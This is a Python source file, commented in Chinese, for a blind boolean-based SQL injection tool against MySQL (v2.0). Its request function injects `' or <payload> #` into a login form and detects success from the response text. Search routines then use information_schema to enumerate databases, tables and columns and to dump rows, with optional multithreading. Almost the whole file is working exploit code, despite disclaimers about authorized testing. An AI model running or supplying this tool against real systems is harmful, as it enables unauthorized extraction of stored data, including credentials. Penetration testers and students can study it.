# -*- coding: utf-8 -*-
"""
MySQL SQL注入测试工具 v2.0
优化版本：使用指数增长方式判断记录数量，减少日志输出
用于安全测试和渗透测试，请仅在授权的环境中使用

核心设计：
- req函数完全由用户自定义，包括URL、请求方式、参数、代理、判断逻辑等
- 工具只提供框架，不预设任何配置
- 用户需要根据具体目标环境编写自己的req函数
- 使用指数增长方式从低到高判断记录数量，提高效率
"""

import sys
import time
import requests
import threading
import warnings
from typing import List, Optional
from datetime import datetime

warnings.filterwarnings("ignore")

# ==================== 全局统计变量 ====================
class Statistics:
    """统计类，用于记录请求数量和耗时"""
    def __init__(self):
        self.request_count = 0
        self.start_time = None
        self.end_time = None
        self.operations = []  # 记录所有操作
    
    def start(self):
        """开始统计"""
        self.request_count = 0
        self.start_time = time.time()
        self.end_time = None
    
    def increment_request(self):
        """增加请求计数"""
        self.request_count += 1
    
    def stop(self):
        """停止统计"""
        self.end_time = time.time()
    
    def add_operation(self, operation_name: str, result: any = None):
        """添加操作记录"""
        if self.start_time is None:
            elapsed = 0
        elif self.end_time is None:
            elapsed = time.time() - self.start_time
        else:
            elapsed = self.end_time - self.start_time
        
        operation_info = {
            "name": operation_name,
            "request_count": self.request_count,
            "elapsed_time": elapsed,
            "result": result,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        self.operations.append(operation_info)
    
    def get_stats(self):
        """获取统计信息"""
        if self.start_time is None:
            return "统计未开始"
        
        if self.end_time is None:
            elapsed = time.time() - self.start_time
        else:
            elapsed = self.end_time - self.start_time
        
        return {
            "请求数量": self.request_count,
            "总耗时": f"{elapsed:.2f}秒",
            "平均耗时": f"{elapsed/self.request_count:.3f}秒/请求" if self.request_count > 0 else "N/A"
        }
    
    def generate_report(self) -> str:
        """生成完整的报告"""
        if not self.operations:
            return "没有操作记录"
        
        report = []
        report.append("# MySQL SQL注入测试报告 v2.0")
        report.append(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")
        
        # 总体统计
        total_requests = sum(op["request_count"] for op in self.operations)
        total_time = sum(op["elapsed_time"] for op in self.operations)
        
        report.append("## 📊 总体统计")
        report.append(f"- **总操作数**: {len(self.operations)}")
        report.append(f"- **总请求数**: {total_requests}")
        report.append(f"- **总耗时**: {total_time:.2f}秒")
        report.append(f"- **平均耗时**: {total_time/total_requests:.3f}秒/请求" if total_requests > 0 else "- **平均耗时**: N/A")
        report.append("")
        
        # 详细操作记录
        report.append("## 📋 详细操作记录")
        for i, op in enumerate(self.operations, 1):
            report.append(f"### {i}. {op['name']}")
            report.append(f"- **时间**: {op['timestamp']}")
            report.append(f"- **请求数**: {op['request_count']}")
            report.append(f"- **耗时**: {op['elapsed_time']:.2f}秒")
            
            # 显示结果数据
            if op['result'] is not None:
                report.append("- **结果**:")
                if isinstance(op['result'], list):
                    if len(op['result']) > 0:
                        if isinstance(op['result'][0], dict):
                            # 表格数据
                            report.append("```")
                            for item in op['result']:
                                report.append(str(item))
                            report.append("```")
                        else:
                            # 简单列表
                            report.append("```")
                            report.append(str(op['result']))
                            report.append("```")
                    else:
                        report.append("  (空结果)")
                elif isinstance(op['result'], dict):
                    report.append("```")
                    report.append(str(op['result']))
                    report.append("```")
                else:
                    report.append(f"  {str(op['result'])}")
            
            report.append("")
        
        return "\n".join(report)
    
    def save_report(self, filename: str = "result.txt"):
        """保存报告到文件"""
        report = self.generate_report()
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"报告已保存到: {filename}")
    
    def print_final_report(self):
        """打印最终报告"""
        print("\n" + "="*60)
        print("MySQL SQL注入测试完成 v2.0")
        print("="*60)
        
        # 打印总体统计
        total_requests = sum(op["request_count"] for op in self.operations)
        total_time = sum(op["elapsed_time"] for op in self.operations)
        
        print(f"总操作数: {len(self.operations)}")
        print(f"总请求数: {total_requests}")
        print(f"总耗时: {total_time:.2f}秒")
        if total_requests > 0:
            print(f"平均耗时: {total_time/total_requests:.3f}秒/请求")
        
        print("\n详细报告已保存到 result.txt")
        print("="*60)

# 全局统计实例
stats = Statistics()

# 字符集定义 - 优化为直接使用ASCII范围
CHAR_RANGES = [
    (97, 122),   # a-z
    (65, 90),    # A-Z
    (48, 57),    # 0-9
]
SPECIAL_CHARS = "_$#-{}()'+[]:/\\,@."

def get_char_set():
    """获取字符集 - 优化版本"""
    chars = []
    for start, end in CHAR_RANGES:
        chars.extend(range(start, end + 1))
    chars.extend(ord(c) for c in SPECIAL_CHARS)
    return sorted(chars)

# ==================== 核心函数：req函数需要用户完全自定义 ====================
def req(payload):
    """
    核心请求函数 - 需要用户完全自定义
    
    参数:
        payload: SQL注入载荷，如 "1=1", "sleep(1)" 等
    
    返回值:
        1: 注入成功（根据用户自定义逻辑判断）
        2: 注入失败（根据用户自定义逻辑判断）
        3: 网络错误
    """
    
    # 增加请求计数
    stats.increment_request()
    
    # ========== 用户自定义区域开始 ==========
    
    # 1. 目标URL - 用户需要修改
    url = "http://127.0.0.1:3333/index.php"
    
    # 2. 请求参数 - 用户需要根据实际情况修改
    data = "username=admin&password=admin' or "+str(payload)+" #"
    
    # 3. 请求头 - 用户可以根据需要修改
    headers = {
        "Content-Type" : "application/x-www-form-urlencoded"
    }
    
    # 4. 代理设置 - 用户可以根据需要修改
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    
    # 5. 发送请求 - 用户可以根据需要修改请求方式
    r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
    resContent = r.content
    
    # 6. 判断逻辑 - 用户需要根据目标系统响应特征自定义
    if "登录成功" in resContent.decode('utf-8'):
        return 1  # 注入成功
    else:
        return 2  # 注入失败
    
    # ========== 用户自定义区域结束 ==========
    
    # 网络错误处理
    return 3

# ==================== 优化后的核心算法 ====================

def exponential_search_count(sql_template: str) -> int:
    """
    使用指数增长方式计算记录数量 - 优化版本
    从1开始，按指数增长方式快速定位记录数量范围
    """
    # 从1开始，按指数增长方式搜索
    current = 1
    while True:
        payload = sql_template.format(current)
        status = req(payload)
        
        if status == 1:  # 成功，继续增加
            current *= 2
            if current > 1000000:  # 防止无限增长
                break
        else:  # 失败，找到上界
            break
    
    # 在找到的范围内使用二分搜索精确定位
    left = current // 2
    right = current
    
    while left < right:
        mid = (left + right) // 2
        payload = sql_template.format(mid)
        status = req(payload)
        
        if status == 1:  # 成功
            left = mid + 1
        else:  # 失败
            right = mid
    
    return left

def binary_search_string(sql_template: str, length: int) -> str:
    """
    使用二分搜索提取字符串 - 优化版本
    """
    char_set = get_char_set()
    result = ""
    
    for pos in range(1, length + 1):
        left, right = 0, len(char_set)
        
        while left < right:
            mid = (left + right) // 2
            char_val = char_set[mid]
            payload = sql_template.format(pos, char_val)
            status = req(payload)
            
            if status == 1:  # 成功
                left = mid + 1
            else:  # 失败
                right = mid
        
        if left < len(char_set):
            try:
                result += chr(char_set[left])
            except:
                result += "${特殊字符}"
    
    return result

# ==================== 数据库操作函数 - 优化版本 ====================

def get_dbs() -> List[str]:
    """获取所有数据库名称"""
    stats.start()
    print("获取数据库列表...")
    
    count_sql = "(select count(*) from information_schema.SCHEMATA) > {}"
    db_count = exponential_search_count(count_sql)
    
    databases = []
    for i in range(db_count):
        db_name = get_db_name(i)
        databases.append(db_name)
    
    stats.stop()
    stats.add_operation("数据库枚举", databases)
    return databases

def get_tables(db_name: str) -> List[str]:
    """获取指定数据库的所有表名"""
    stats.start()
    print(f"获取数据库 '{db_name}' 的表列表...")
    
    count_sql = f"(select count(*) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}') > {{}}"
    table_count = exponential_search_count(count_sql)
    
    tables = []
    for i in range(table_count):
        table_name = get_table_name(db_name, i)
        tables.append(table_name)
    
    stats.stop()
    stats.add_operation(f"表枚举 ({db_name})", tables)
    return tables

def get_columns(db_name: str, table_name: str) -> List[str]:
    """获取指定表的所有列名"""
    stats.start()
    print(f"获取表 '{db_name}.{table_name}' 的列列表...")
    
    count_sql = f"(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}') > {{}}"
    column_count = exponential_search_count(count_sql)
    
    columns = []
    for i in range(column_count):
        column_name = get_column_name(db_name, table_name, i)
        columns.append(column_name)
    
    stats.stop()
    stats.add_operation(f"列枚举 ({db_name}.{table_name})", columns)
    return columns

def get_data(db_name: str, table_name: str, column_name: str, 
             where_clause: str = "1=1", row_index: int = 0) -> str:
    """获取指定列的数据"""
    stats.start()
    
    length_sql = f"(select length({column_name}) from {db_name}.{table_name} where {where_clause} limit {row_index},1) > {{}}"
    data_length = exponential_search_count(length_sql)
    
    data_sql = f"(select ord(substring({column_name}, {{}}, 1)) from {db_name}.{table_name} where {where_clause} limit {row_index},1) > {{}}"
    result = binary_search_string(data_sql, data_length)
    
    stats.stop()
    stats.add_operation(f"数据提取 ({db_name}.{table_name}.{column_name})", result)
    return result

def get_all_data(db_name: str, table_name: str, 
                 where_clause: str = "1=1", max_rows: int = 10, columns: List[str] = None) -> List[dict]:
    """获取表的所有数据"""
    stats.start()
    print(f"获取表 '{db_name}.{table_name}' 的数据...")
    
    # 获取列名（如果未提供）
    if columns is None:
        columns = get_columns(db_name, table_name)
    
    # 获取行数
    count_sql = f"(select count(*) from {db_name}.{table_name} where {where_clause}) > {{}}"
    row_count = min(exponential_search_count(count_sql), max_rows)
    
    all_data = []
    for row_index in range(row_count):
        row_data = {}
        for column in columns:
            value = get_data(db_name, table_name, column, where_clause, row_index)
            row_data[column] = value
        all_data.append(row_data)
    
    stats.stop()
    stats.add_operation(f"全表数据提取 ({db_name}.{table_name})", all_data)
    return all_data

# ==================== 内部辅助函数 - 优化版本 ====================

def get_db_name(index: int) -> str:
    """获取数据库名称"""
    length_sql = f"(select length(SCHEMA_NAME) from information_schema.SCHEMATA limit {index},1) > {{}}"
    name_length = exponential_search_count(length_sql)
    
    name_sql = f"(select ord(substring(SCHEMA_NAME, {{}}, 1)) from information_schema.SCHEMATA limit {index},1) > {{}}"
    return binary_search_string(name_sql, name_length)

def get_table_name(db_name: str, index: int) -> str:
    """获取表名称"""
    length_sql = f"(select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}' limit {index},1) > {{}}"
    name_length = exponential_search_count(length_sql)
    
    name_sql = f"(select ord(substring(TABLE_NAME, {{}}, 1)) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}' limit {index},1) > {{}}"
    return binary_search_string(name_sql, name_length)

def get_column_name(db_name: str, table_name: str, index: int) -> str:
    """获取列名称"""
    length_sql = f"(select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}' limit {index},1) > {{}}"
    name_length = exponential_search_count(length_sql)
    
    name_sql = f"(select ord(substring(COLUMN_NAME, {{}}, 1)) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}' limit {index},1) > {{}}"
    return binary_search_string(name_sql, name_length)

# ==================== 多线程优化版本 ====================

class ThreadWorker(threading.Thread):
    """线程工作类"""
    def __init__(self, func, args):
        super().__init__()
        self.func = func
        self.args = args
        self.result = None
    
    def run(self):
        self.result = self.func(*self.args)

def parallel_get_columns(db_name: str, table_name: str) -> List[str]:
    """多线程获取列名"""
    stats.start()
    print(f"多线程获取表 '{db_name}.{table_name}' 的列列表...")
    
    count_sql = f"(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}') > {{}}"
    column_count = exponential_search_count(count_sql)
    
    threads = []
    for i in range(column_count):
        thread = ThreadWorker(get_column_name, (db_name, table_name, i))
        threads.append(thread)
        thread.start()
    
    columns = []
    for thread in threads:
        thread.join()
        columns.append(thread.result)
    
    stats.stop()
    stats.add_operation(f"多线程列枚举 ({db_name}.{table_name})", columns)
    return columns

def parallel_get_data(db_name: str, table_name: str, 
                     where_clause: str = "1=1", row_index: int = 0, columns: List[str] = None) -> dict:
    """多线程获取行数据"""
    stats.start()
    print(f"多线程获取表 '{db_name}.{table_name}' 第{row_index+1}行数据...")
    
    # 获取列名（如果未提供）
    if columns is None:
        columns = parallel_get_columns(db_name, table_name)
    
    threads = []
    for column in columns:
        thread = ThreadWorker(get_data, (db_name, table_name, column, where_clause, row_index))
        threads.append(thread)
        thread.start()
    
    row_data = {}
    for i, thread in enumerate(threads):
        thread.join()
        row_data[columns[i]] = thread.result
    
    stats.stop()
    stats.add_operation(f"多线程数据提取 ({db_name}.{table_name})", row_data)
    return row_data

# ==================== 便捷函数 ====================

def quick_scan(db_name: str, table_name: str, max_rows: int = 3):
    """快速扫描表数据"""
    stats.start()
    print(f"快速扫描: {db_name}.{table_name}")
    
    # 获取列名
    columns = get_columns(db_name, table_name)
    
    # 获取数据 - 使用已获取的列名，避免重复获取
    all_data = get_all_data(db_name, table_name, "1=1", max_rows, columns)
    
    stats.stop()
    stats.add_operation(f"快速扫描 ({db_name}.{table_name})", all_data)
    return all_data

def get_database_info() -> dict:
    """获取数据库信息摘要"""
    stats.start()
    print("获取数据库信息摘要...")
    
    databases = get_dbs()
    info = {}
    
    for db_name in databases:
        tables = get_tables(db_name)
        table_info = {}
        
        for table_name in tables:
            columns = get_columns(db_name, table_name)
            table_info[table_name] = columns
        
        info[db_name] = table_info
    
    stats.stop()
    stats.add_operation("数据库信息摘要", info)
    return info

# ==================== 统计工具函数 ====================

def reset_statistics():
    """重置统计信息"""
    global stats
    stats = Statistics()
    print("统计信息已重置")

def get_current_stats():
    """获取当前统计信息"""
    return stats.get_stats()

def print_current_stats():
    """打印当前统计信息"""
    stats.print_final_report()

def save_final_report(filename: str = "result.txt"):
    """保存最终报告"""
    stats.save_report(filename)

# ==================== 主程序 ====================

if __name__ == "__main__":
    print("MySQL SQL注入测试工具 v2.0 - 指数增长优化版本")
    print("=" * 50)
    print("重要提示：")
    print("1. 请先修改req函数中的目标URL、请求参数、代理设置等")
    print("2. 根据目标系统响应特征自定义判断逻辑")
    print("3. 确保有合法的测试权限")
    print("4. 使用指数增长方式判断记录数量，提高效率")
    print("5. 完成后会生成详细报告并保存到result.txt")
    print("=" * 50)
    
    try:
        # 示例用法
        # databases = get_dbs()  # 获取所有数据库
        # tables = get_tables("testdb")  # 获取指定数据库的表
        # columns = get_columns("testdb", "user")  # 获取指定表的列
        data = quick_scan("testdb", "user")  # 快速扫描表数据
        
        # 打印最终报告
        stats.print_final_report()
        
        # 保存报告到文件
        save_final_report()
        
    except Exception as e:
        print(f"执行过程中出现错误: {e}")
        # 即使出错也保存已完成的统计信息
        if stats.operations:
            stats.print_final_report()
            save_final_report()
    
    print("工具已优化完成，请根据实际需求修改req函数后使用") 